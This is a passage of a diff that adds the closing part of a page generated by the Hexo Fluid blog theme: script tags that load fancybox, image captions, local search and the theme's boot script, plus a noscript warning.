+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
